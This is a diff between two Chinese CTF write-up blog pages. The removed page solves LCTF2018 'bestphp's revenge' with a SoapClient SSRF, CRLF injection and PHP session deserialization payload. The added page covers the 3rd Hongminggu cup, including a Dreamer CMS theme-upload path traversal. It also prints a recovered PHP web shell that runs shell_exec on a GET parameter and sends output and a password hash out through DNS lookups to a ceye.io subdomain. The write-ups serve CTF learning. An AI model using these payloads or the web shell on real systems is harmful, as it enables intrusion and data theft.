@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>bestphp&#39;s revenge | 甜筒园</title>
-  <meta name="keywords" content=" ssrf漏洞 , session反序列化 , CRLF Injection ">
-  <meta name="description" content="bestphp&#39;s revenge | 甜筒园">
+  <title>第三届红明谷杯 | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="第三届红明谷杯 | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="点击签到 const encodedSecret&#x3D; &#96;uuuuuvvvvvvvvvvvvuuvvvvvvvvvvvvvuuuuvvvvvvvvvvvvvvvuuuuuuuuuuuuuuuuuuuuuuuuuuvvvuuuu  uuuvvvuuvvvvvvvuvvvvuuuuuuuuuuuuuuuuuuuuuuuuuvvvv">
 <meta property="og:type" content="article">
@@ -514,9 +514,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-bestphps-revenge" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-第三届红明谷杯" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">bestphp&#39;s revenge</h1>
+        <h1 class="article-title">第三届红明谷杯</h1>
     
     <div class="article-meta">
         
@@ -531,26 +531,15 @@
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color2">ssrf漏洞</a>
-            
-            <a class="color2">session反序列化</a>
-            
-            <a class="color5">CRLF Injection</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-04-19 21:03:33'>2023-04-19 14:18</time>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-21 16:10:19'>2023-03-14 19:17</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>Count:1.5k</span>
+        <span>Count:1.2k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -580,7 +569,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php%E5%86%85%E7%BD%AE%E7%B1%BBSoapClient"><span class="toc-text">1.php内置类SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CRLF-Injection%E6%BC%8F%E6%B4%9E"><span class="toc-text">2. CRLF Injection漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-call-user-func"><span class="toc-text">3.call_user_func</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-PHPsession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">4.PHPsession 反序列化</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%82%B9%E5%87%BB%E7%AD%BE%E5%88%B0"><span class="toc-text">点击签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dreamer"><span class="toc-text">Dreamer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dreamer-revenge"><span class="toc-text">Dreamer_revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hacker"><span class="toc-text">hacker</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -596,133 +585,244 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>题目源码:</p>
-<pre><code class="php">&lt;?php
-highlight_file(__FILE__);
-$b = &#39;implode&#39;;
-call_user_func($_GET[&#39;f&#39;], $_POST);
-session_start();
-if (isset($_GET[&#39;name&#39;])) &#123;
-  $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];
-&#125;
-var_dump($_SESSION);
-$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
-call_user_func($b, $a);
+        <h2 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a>点击签到</h2><pre><code class="js">
+const encodedSecret= `uuuuuvvvvvvvvvvvvuuvvvvvvvvvvvvvuuuuvvvvvvvvvvvvvvvuuuuuuuuuuuuuuuuuuuuuuuuuuvvvuuuu 
+uuuvvvuuvvvvvvvuvvvvuuuuuuuuuuuuuuuuuuuuuuuuuvvvvvuuuu 
 
-//flag.php(扫目录扫的)
-only localhost can get flag!session_start();
-echo &#39;only localhost can get flag!&#39;;
-$flag = &#39;LCTF&#123;*************************&#125;&#39;;
-if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;
-       $_SESSION[&#39;flag&#39;] = $flag;
-   &#125;
-only localhost can get flag!
+uuvvvuuuuuuuuuuuuuvvvvuuuuuuuvvvvuuuuuuuvvvvuuuuuuuuuuuuuuuuuuuuuuuuuuuuvvvvvvuuuu 
+
+
+uvvvvuuuuvvvvvvvuvvvvvvvvvvvvvvuuuuuuuuvvvvuuuuuuuuvvvvvvvvvvvuuuuuuvvvvvvvuuuu 
+
+
+
+uvvvvuuuvvvvuvvvvuuuuuuuuuuvvvvuuuuuuuvuuuuuvvvuuvvvvuuuu 
+
+
+
+
+uvvvvuuuuuuuvvvvuvvvvuuuuuuuuuuuuuuuuuuuvvvvuuuuuuuuuuuuuuuuuuuuuuvvvvvvvvvvvvvvvvu 
+
+
+
+
+
+uvvvvuuuuuuuvvvvuvvvvuuuuuuuuuuuuuuuuuuuvvvvuuuuuuuuuuuuuuuuuuuuuvvvvuu 
+
+
+
+
+
+
+uvvvvvvvvvvvvvuuvvvvuuuuuuuuuuuuuuuuuuuvvvvuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuvvvvuuuu 
+
+
+
+
+
+
+
+uuvuuuuvuuuuuuuuuuuuuuuuuuuuvuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuvuuuuu 
+
+
+
+
+
+
+
+
+uuuuuuuuuuuuuuuuuuuuuuuuuLFKMQKILLNKOIKHHHIHHWuuuuuuuuuuuuuuuuuuuuu`;
+
+    function _0x3aef(_0x123456) &#123;
+        var _0xabcdef = &#39;&#39;;
+        for (var _0x10 = 0x0; _0x10 &lt; _0x123456.length; _0x10++) &#123;
+            _0xabcdef += String.fromCharCode(_0x123456.charCodeAt(_0x10) ^ 0x2a);
+        &#125;
+        return _0xabcdef;
+    &#125;
+
+    function decrypt() &#123;
+        var encodedSecret = _0x4a12;
+        return _0x3aef(encodedSecret);
+    &#125;
+
+const decryptedSecret = _0x3aef(encodedSecret);
+console.log(decryptedSecret);
 </code></pre>
-<p>先来学习一些知识点：</p>
-<hr>
-<h3 id="1-php内置类SoapClient"><a href="#1-php内置类SoapClient" class="headerlink" title="1.php内置类SoapClient"></a>1.php内置类SoapClient</h3><p>​         SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/1999159-20210127114912726-2133757689.jpg"></p>
-<p>​         第一个参数的意思是：控制是否是wsdl模式，如果为NULL，就是非wsdl模式.如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，第二个参数的意思是：一个数组，里面是soap请求的一些参数和属性。</p>
-<p><strong>简单的用法</strong></p>
-<pre><code class="php">&lt;?php
-$a = new SoapClient(null,array(location&#39;=&gt;&#39;http://127.0.0.1/flag.php&#39;,&#39;uri&#39;=&#39;http://127.0.0.1/&#39;));
-$b = serialize($a);
-echo $b;
-$c = unserialize($b);
-$c-&gt;a();
+<p>根据代码写出解密脚本，运行一下就得到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230419142137685.png" alt="image-20230419142137685"></p>
+<h2 id="Dreamer"><a href="#Dreamer" class="headerlink" title="Dreamer"></a>Dreamer</h2><p>参考以下博客：</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/2183">Dreamer CMS 代码审计</a></p>
+<p>下载源码后修改<code>src\main\resources\db\dreamer-cms\templates\default_v2</code>目录下的theme.json文件，将其中的<code>themePath</code>值修改成<code>../../../../../../../../../../../../../../</code></p>
+<p>然后打包成zip在后台风格管理处上传并启用主题：</p>
+<pre><code>访问后台管理界面：
+http://123.57.95.203:29912/admin/
+管理员账户密码（在REMDME.md)中查看：
+- 管理员：wangjn
+- 管理员密码：123456
 </code></pre>
-<p>​        可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> （当调用对象中不存在的方法会自动调用此方法）方法来进行 <strong>SSRF</strong></p>
-<h3 id="2-CRLF-Injection漏洞"><a href="#2-CRLF-Injection漏洞" class="headerlink" title="2. CRLF Injection漏洞"></a>2. CRLF Injection漏洞</h3><p>​        <strong>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</strong><br><strong>简单来说</strong><br><strong>http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</strong></p>
-<pre><code class="php">&lt;?php
-$target = &quot;http://127.0.0.1/flag.php&quot;;
-$options = array(
-    &quot;location&quot; =&gt; $target,
-    &quot;user_agent&quot; =&gt; &quot;ttycp3\r\nCookie: PHPSESSID=114514\r\n&quot;,
-    &quot;uri&quot; =&gt; &quot;demo&quot;
-);
-$attack = new SoapClient(null,$options);
-$payload = serialize($attack);
-unserialize($payload)-&gt;ff(); // 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求
+<p>上传<code>default_v2.zip</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230419143311467.png" alt="image-20230419143311467"></p>
+<p>点击启用</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230419143438367.png" alt="image-20230419143438367"></p>
+<p>在模板管理中找到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230419143517688.png" alt="image-20230419143517688"></p>
+<h2 id="Dreamer-revenge"><a href="#Dreamer-revenge" class="headerlink" title="Dreamer_revenge"></a>Dreamer_revenge</h2><p>题目源码没变，这次flag放到redis里了，访问<code>/var/lib/redis</code>找到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230419144308871.png" alt="image-20230419144308871"></p>
+<h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>通过对流量包的分析找到关键源码：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230419181237850.png" alt="image-20230419181237850"></p>
+<p>urldecode一下再美化格式：</p>
+<pre><code class="php">&lt;?php 
+$servername=&quot;127.0.0.1&quot;;
+$username=&quot;root&quot;;
+$password=&quot;123456&quot;;
+$dbname=&quot;zentao&quot;;
+$conn=new PDO(&quot;mysql:host=$servername;
+dbname=$dbname&quot;,$username,$password);
+$conn-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
+$stmt=$conn-&gt;prepare(&quot;SELECT password FROM zt_user WHERE account=\&#39;admin\&#39;&quot;);
+$stmt-&gt;execute();
+$result=$stmt-&gt;fetch(PDO::FETCH_ASSOC);
+$conn=null;
+$param=$_GET[&quot;cmd&quot;];
+$password=$result[&quot;password&quot;];
+$output=shell_exec($param);
+$hex_output=bin2hex($output);
+$hex_password=bin2hex($password);
+$len_output=strlen($hex_output);
+$len_password=strlen($hex_password);
+$max_subdomain_length=62;
+$subdomain_base=&quot;yafgcy.ceye.io&quot;;
+$hex_xor=&quot;&quot;;
+for($i=0;$i&lt;$len_output;$i++)&#123;
+    $char_output=$hex_output[$i];
+    $char_password=$hex_password[$i%$len_password];
+    $char_xor=dechex(hexdec($char_output)^hexdec($char_password));
+    if(strlen($hex_xor.$char_xor)&gt;$max_subdomain_length)			&#123;
+        if(strlen($hex_xor)%2!=0&#123;
+            $subdomain=&quot;0&quot;.&quot;$hex_xor.$subdomain_base&quot;;
+        &#125;else&#123;
+            $subdomain=&quot;$hex_xor.$subdomain_base&quot;;
+        &#125;
+        gethostbyname($subdomain);
+        $hex_xor=&quot;&quot;;
+    &#125;
+    else&#123;
+        $hex_xor.=$char_xor;
+    &#125;
+&#125;
+    if(strlen($hex_xor)%2!=0&#123;
+        $subdomain=&quot;0&quot;.&quot;$hex_xor.$subdomain_base&quot;;
+    &#125;else&#123;
+        $subdomain=&quot;$hex_xor.$subdomain_base&quot;;
+    &#125;
+    gethostbyname($subdomain);
 ?&gt;
 </code></pre>
-<h3 id="3-call-user-func"><a href="#3-call-user-func" class="headerlink" title="3.call_user_func"></a>3.call_user_func</h3><p><strong>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</strong></p>
-<p>先传入<code>extract()</code>，将<code>$b</code>覆盖成回调函数，这样题目中的 <code>call_user_func($b,$a)</code> 就可以变成 <code>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</code> ，即调用 <strong>SoapClient</strong> 类不存在的 <strong>welcome_to_the_lctf2018</strong> 方法，从而触发 <strong>__call</strong> 方法发起 <strong>soap</strong> 请求进行 <strong>SSRF</strong> 。</p>
-<h3 id="4-PHPsession-反序列化"><a href="#4-PHPsession-反序列化" class="headerlink" title="4.PHPsession 反序列化"></a>4.PHPsession 反序列化</h3><pre><code>session.save_handler  session保存形式。默认为files
-
-session.save_path    session保存路径
-
-session.serialize_handler  session序列化存储所用处理器。默认为php
+<p>通过分析，<code>$output</code>中存放着flag，<code>$password</code>的值为admin的密码。可以在流量中找到</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230419183059974.png" alt="image-20230419183059974"></p>
+<p>通过对两个字符串的操作，得到一个新的字符串，新的字符串可以在DNS中找到</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230419183413046.png" alt="image-20230419183413046"></p>
+<p><code>yafgcy.ceye.io</code>前面的内容就是新的字符串</p>
+<p>这里注意</p>
+<pre><code class="php">if(strlen($hex_xor.$char_xor)&gt;$max_subdomain_length)&#123;
+        if(strlen($hex_xor)%2!=0&#123;
+            $subdomain=&quot;0&quot;.&quot;$hex_xor.$subdomain_base&quot;;
+        &#125;else&#123;
+            $subdomain=&quot;$hex_xor.$subdomain_base&quot;;
+        &#125;
+        gethostbyname($subdomain);
+        $hex_xor=&quot;&quot;;
+    &#125;
 </code></pre>
-<p>session中有三种序列化处理器处理session的情况</p>
-<pre><code class="php">&lt;?php 
-
-session_start();
-
-$_SESSION[&#39;name&#39;]=&#39;ttycp3&#39;;
-</code></pre>
-<pre><code class="php">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值
-    
-php 键名+竖线（|）+经过serialize()函数处理过的值
-    
-php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化
-    
-    
-例如：    
-当 session.serialize_handler=php 时，session文件内容为： name|s:6:&quot;ttycp3&quot;;  
-
-当 session.serialize_handler=php_serialize 时，session文件为： a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;ttycp3&quot;;&#125;
-
-当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符names:6:&quot;ttycp3&quot;;
-</code></pre>
-<p>使用不同引擎就会发生漏洞，通常是先使用php_serialize进行序列化，然后php默认引擎进行反序列化，这是因为<strong>php引擎反序列化时，|被当做分隔符</strong></p>
-<p>例如</p>
-<p>php_serialize引擎  a:1:{s:4:”name”;s:9:”|username”;}</p>
-<p>php  就会反序列化username ，前面是键名，后面是键值</p>
-<p>所以我们只需要传入$_SESSION[‘name’] &#x3D; |序列化内容</p>
-<hr>
-<p>接下来分析题目:</p>
-<p>​          flag.php 文件中告诉我们，只有 127.0.0.1 请求该页面才能得到 flag ，所以这明显又是考察 SSRF 漏洞，这里我们便可以利用 SoapClient 类的 __call 方法来进行 SSRF</p>
-<p>第一步：由于 PHP 中的原生 SoapClient 类存在 CRLF 漏洞，所以我们可以伪造任意 header ，构造 <strong>SoapClient</strong> 类，并用php_serialize引擎进行序列化，存入session</p>
-<p>​        这里还用到一个知识点：<strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。</strong></p>
-<p> 脚本构造：</p>
+<p>如果长度大于62的话，$char_xor会丢掉一个字符，然后输出，所以我们获得的四段字符串中间缺少了3个字符，另外如果长度为奇数会多补一个0，需要把第四段获得的字符串前面的0去掉，再爆破剩下的3个字符就可以了。</p>
 <pre><code class="php">&lt;?php
-$target=&#39;http://127.0.0.1/flag.php&#39;;
-$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,
-    &#39;user_agent&#39; =&gt; &quot;ttycp3\r\nCookie:PHPSESSID=123456\r\n&quot;,
-    &#39;uri&#39; =&gt; &quot;http://127.0.0.1/&quot;));
+function MIMA($subdomain)&#123;
+    $password = &#39;8a3e684c923b763d252cf1e8734a7a29&#39;;
+    $output = &#39;&#39;;
+    $len_hex_substring = strlen($subdomain);
+    for ($i = 0; $i &lt; $len_hex_substring; $i += 2) &#123;
+        $char_hex = substr($subdomain, $i, 2);
+        $char_password = $password[$i / 2 % strlen($password)];
+        $output .= chr(hexdec($char_hex) ^ ord($char_password));
+    &#125;
+    return $output;
+&#125;
+$string1 = &#39;79227024716c7522787370254c777230667673222570247b76677322632671&#39;;
+$string2 = &#39;d7b357226771575227a7372237677702573611f372570317b7672772076206&#39;;
+$string3 = &#39;1479207024777b60247e6674231a626727666171372570317f766773207620&#39;;
+$string4 = &#39;67879226731756c60206d75703670754e&#39;;
+$jiemi = &#39;0123456789abcdef&#39;;
+for ($k=0;$k&lt;strlen($jiemi);$k++)&#123;
+    for ($j=0;$j&lt;strlen($jiemi);$j++)&#123;
+        for ($l=0;$l&lt;strlen($jiemi);$l++)&#123;
+            $math = $string1.$jiemi[$k].$string2.$jiemi[$k].$string3.$jiemi[$k].$string4;
+            echo MIMA($math).PHP_EOL;
+        &#125;
+    &#125;
+&#125;
 
-$se = serialize($b);
-echo &quot;|&quot;.urlencode($se);
+?&gt;
+</code></pre>
+<p>脚本运行后我们获得了大量的类似于flag的字符串，因为flag固定格式是<code>flag&#123;&#125;</code>，所以<code>ACCAGTAAAACG</code>代表<code>flag</code>,观察发现只有<code>ACGT</code>四个字符组成，三个字符对应着另一个字符，且发现<code>AAA</code>对应小写字母<code>a</code>,可猜测字典为<code>a-zA-Z0-9</code>。于是从众多字符串中筛选出只含<code>ACGT</code>及其他非字母字符的字符串，再对应解密获取flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230419185242520.png" alt="image-20230419185242520"></p>
+<p>完整脚本为：</p>
+<pre><code class="php">&lt;?php
+function MIMA($subdomain)&#123;
+    $password = &#39;8a3e684c923b763d252cf1e8734a7a29&#39;;
+    $output = &#39;&#39;;
+    $len_hex_substring = strlen($subdomain);
+    for ($i = 0; $i &lt; $len_hex_substring; $i += 2) &#123;
+        $char_hex = substr($subdomain, $i, 2);
+        $char_password = $password[$i / 2 % strlen($password)];
+        $output .= chr(hexdec($char_hex) ^ ord($char_password));
+    &#125;
+    return $output;
+&#125;
+$string1 = &#39;79227024716c7522787370254c777230667673222570247b76677322632671&#39;;
+$string2 = &#39;d7b357226771575227a7372237677702573611f372570317b7672772076206&#39;;
+$string3 = &#39;1479207024777b60247e6674231a626727666171372570317f766773207620&#39;;
+$string4 = &#39;67879226731756c60206d75703670754e&#39;;
+$jiemi = &#39;0123456789abcdef&#39;;
+$allowed_chars=&quot;/^[ACGT\-\&#123;\&#125;]+$/&quot;;
+for ($k=0;$k&lt;strlen($jiemi);$k++)&#123;
+    for ($j=0;$j&lt;strlen($jiemi);$j++)&#123;
+        for ($l=0;$l&lt;strlen($jiemi);$l++)&#123;
+            $math = $string1.$jiemi[$k].$string2.$jiemi[$k].$string3.$jiemi[$k].$string4;
+            if (preg_match($allowed_chars, MIMA($math))) &#123;
+                echo MIMA($math);exit(0);
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<pre><code>ACCAGTAAAACG&#123;AATTCAACAACATGCTGCTCTACA-AACAAAAACAAT-TCATCAACAAAT-AACAACTGGTGA-TTCTTCTCATGATGAAATAACTTCTTCTGCTGC&#125;
+</code></pre>
+<pre><code class="python">import string
+zidian=string.ascii_lowercase+string.ascii_uppercase+string.digits
+dicty=&#123;&quot;A&quot;:&quot;0&quot;,&quot;C&quot;:&quot;1&quot;,&quot;G&quot;:&quot;2&quot;,&quot;T&quot;:&quot;3&quot;,&quot;&#123;&quot;:&quot;&#123;&quot;,&quot;&#125;&quot;:&quot;&#125;&quot;,&quot;-&quot;:&quot;-&quot;&#125;
+d=[&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;-&#39;]
+flag_encode=list(&quot;ACCAGTAAAACG&#123;AATTCAACAACATGCTGCTCTACA-AACAAAAACAAT-TCATCAACAAAT-AACAACTGGTGA-TTCTTCTCATGATGAAATAACTTCTTCTGCTGC&#125;&quot;)
+flag_decode=&quot;&quot;
+for i in range(len(flag_encode)):
+    flag_encode[i]=dicty[flag_encode[i]]
+i=0
+while i&lt;len(flag_encode):
+    if flag_encode[i] in d:
+        flag_decode += flag_encode[i]
+        if i+1 &gt;= len(flag_encode):
+            break
+        sum=int(flag_encode[i+1])*16+int(flag_encode[i+2])*4+int(flag_encode[i+3])
+        i+=4
+    else:
+        sum=int(flag_encode[i])*16+int(flag_encode[i+1])*4+int(flag_encode[i+2])
+        i+=3
+    flag_decode+=zidian[sum]
 
-//注意下，这个脚本想要执行，需要将php.ini里的extension=soap前面的分号去掉
+print(flag_decode)
 </code></pre>
-<p> 执行后得到</p>
-<pre><code>|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A33%3A%22ttycp3%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+<pre><code>flag&#123;d0ee553e-babd-00ed-bb64-99044db9955&#125;
 </code></pre>
-<p>传参：</p>
-<pre><code class="html">GET:
-f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A33%3A%22ttycp3%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
-
-POST:
-serialize_handler=php_serialize
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314193907764.png" alt="image-20230314193907764"></p>
-<p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法</p>
-<p>传值f&#x3D;extract&amp;name&#x3D;SoapClient POST:b&#x3D;call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 。</p>
-<p>传参：</p>
-<pre><code>GET:
-f=extract&amp;name=SoapClient
-POST:
-b=call_user_func
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314194523209.png" alt="image-20230314194523209"></p>
-<p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p>
-<p>传参：</p>
-<pre><code>Cookie:PHPSESSID=123456
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314194729913.png" alt="image-20230314194729913"></p>
-<p><strong>参考</strong></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/14335370.html">bestphp’s revenge[详解]</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
